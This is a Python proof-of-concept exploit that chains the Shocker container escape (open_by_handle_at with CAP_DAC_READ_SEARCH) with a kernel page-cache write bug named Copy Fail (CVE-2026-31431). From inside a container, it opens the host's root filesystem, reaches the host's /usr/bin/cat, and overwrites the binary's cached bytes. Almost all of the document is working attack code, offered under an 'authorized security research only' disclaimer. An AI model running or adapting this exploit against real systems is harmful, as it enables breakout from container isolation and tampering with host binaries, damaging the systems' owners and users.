#!/usr/bin/env python3
# Author: reinject
"""
Shocker + Copy Fail: Container escape via CAP_DAC_READ_SEARCH.

Combines the Shocker attack (open_by_handle_at to access host filesystem)
with Copy Fail (CVE-2026-31431) to corrupt host files from within a
container that has CAP_DAC_READ_SEARCH.

This script is for authorized security research only.
"""
import os
import ctypes
import struct
import socket

libc = ctypes.CDLL("libc.so.6", use_errno=True)


class FileHandle(ctypes.Structure):
    _fields_ = [
        ("handle_bytes", ctypes.c_uint),
        ("handle_type", ctypes.c_int),
        ("f_handle", ctypes.c_ubyte * 128),
    ]


AF_ALG = 38
SOL_ALG = 279
AUTHSIZE = 4
ASSOCLEN = 8
MSG_MORE = 0x8000


def build_key():
    return struct.pack("<HH", 8, 1) + struct.pack(">I", 16) + b"\x00" * 32


def page_cache_write_4bytes(fd, offset, value):
    """Write 4 bytes to a file's page cache via Copy Fail."""
    s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    s.setsockopt(SOL_ALG, 1, build_key())
    s.setsockopt(SOL_ALG, 5, None, AUTHSIZE)
    r, _ = s.accept()

    aad = b"A" * 4 + value
    r.sendmsg([aad], [
        (SOL_ALG, 3, struct.pack("<I", 0)),
        (SOL_ALG, 2, struct.pack("<I", 16) + b"\x00" * 16),
        (SOL_ALG, 4, struct.pack("<I", ASSOCLEN))
    ], MSG_MORE)

    pr, pw = os.pipe()
    os.splice(fd, pw, offset + AUTHSIZE, offset_src=0)
    os.splice(pr, r.fileno(), offset + AUTHSIZE)
    try:
        r.recv(ASSOCLEN + offset)
    except OSError:
        pass
    r.close()
    s.close()
    os.close(pr)
    os.close(pw)


# Step 1: Shocker — open host root via open_by_handle_at
mount_fd = os.open("/etc/hostname", os.O_RDONLY)
root_fh = FileHandle()
root_fh.handle_bytes = 12
root_fh.handle_type = 129  # XFS handle type
root_fh.f_handle[0] = 0x80  # inode 128 (root inode on XFS)

root_fd = libc.syscall(304, mount_fd, ctypes.byref(root_fh),
                        os.O_RDONLY | 0o200000)
print(f"[1] Host root fd: {root_fd}")
if root_fd < 0:
    print(f"    errno: {ctypes.get_errno()}")
    exit(1)

# Step 2: Traverse to /usr/bin/cat on the host
SYS_openat = 257
usr_fd = libc.syscall(SYS_openat, root_fd, b"usr",
                       os.O_RDONLY | 0o200000, 0)
bin_fd = libc.syscall(SYS_openat, usr_fd, b"bin",
                       os.O_RDONLY | 0o200000, 0)
cat_fd = libc.syscall(SYS_openat, bin_fd, b"cat", os.O_RDONLY, 0)
print(f"[2] Host /usr/bin/cat fd: {cat_fd}")

before = os.pread(cat_fd, 16, 0)
print(f"[3] Before: {before.hex()}")

# Step 3: Copy Fail — corrupt the host binary's page cache
page_cache_write_4bytes(cat_fd, 0, b"\xDE\xAD\xBE\xEF")

after = os.pread(cat_fd, 16, 0)
print(f"[4] After:  {after.hex()}")
if after[:4] == b"\xde\xad\xbe\xef":
    print("[+] SUCCESS: Host /usr/bin/cat corrupted via Shocker + Copy Fail!")
else:
    print("[-] Corruption failed")

for fd in [cat_fd, bin_fd, usr_fd, root_fd, mount_fd]:
    os.close(fd)
